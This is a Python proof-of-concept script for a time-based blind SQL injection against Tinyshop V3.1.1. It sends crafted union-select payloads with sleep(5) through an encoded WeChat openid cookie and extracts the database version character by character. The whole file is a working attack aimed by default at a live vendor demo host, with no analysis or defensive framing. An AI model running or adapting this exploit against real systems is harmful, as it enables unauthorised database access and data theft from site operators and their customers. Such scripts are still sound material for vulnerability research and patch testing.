#coding=utf-8
import requests
import time
'''Tinyshop V3.1.1 SQLi POC'''
'''Write by D12ea1v1'''

headers1={'Host': 'localhost',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'keep-alive'
        }
headers2={'Host': 'shop.tinyrise.org',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Cookie': "Tiny_weixin_openid=1d490590f3BwEECQIDCVUAAQpQAFUKUFRcClUFAFBRUgIDDQFTDAAFEkVDVgwOWhhCVA1UUUQQBxkKSgIfDBsHHFRKVB9eGkBfBgRJSwRPSRsV;safecode=1;",
        'Connection': 'keep-alive'
        }
data='0123456789@_.abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
result=''
length=0
print 'Start to retrive:'

'''填写测试的地址'''
url='http://shop.tinyrise.org'

'''Query select  * from tiny_oauth_user  where oauth_type='WeixinOAuth' and open_id='1' union select 1,2,3,4,5,6,7,8,if(length(version())>1,sleep(5),0)-- '''

for i in range(1,99):
	payload="1' union select 1,2,3,4,5,6,7,8,if(length(version())>"+str(i)+",sleep(5),0)-- "
	res=requests.get('http://localhost/encode.php?string='+payload,headers=headers1)
	encode_payload='Tiny_weixin_openid='+res.text+';safecode=1;'
	#print encode_payload
	headers2['Cookie']=encode_payload
	#print headers2['Cookie']
	startTime=time.time()
	res=requests.get(url+'/index.php',headers=headers2)
	if time.time() - startTime > 5:
		length+=1
	else :
		length+=1
		print 'string length is '+str(length)
		break


'''Query select  * from tiny_oauth_user  where oauth_type='WeixinOAuth' and open_id='1' union select 1,2,3,4,5,6,7,8,if((version() like '5%',sleep(5),0)-- '''
payload=''
for i in range(0,length): 
        for char in data:    #遍历取出字符
				payload="1' union select 1,2,3,4,5,6,7,8,if(version() like '"+result+char+"%',sleep(5),0)-- "
				print payload
				res=requests.get('http://localhost/encode.php?string='+payload,headers=headers1)
				encode_payload='Tiny_weixin_openid='+res.text+';safecode=1;'
				#print encode_payload
				headers2['Cookie']=encode_payload
				startTime=time.time()
				res=requests.get(url+'/index.php',headers=headers2)
				if time.time() - startTime > 5:    #判断是否延时了5秒
					result+=char    #连接进result里 退出当前循环
					print 'version is:'+result
					break
print '\n[Done] version is %s' %result    #匹配不出数据后 打印变量
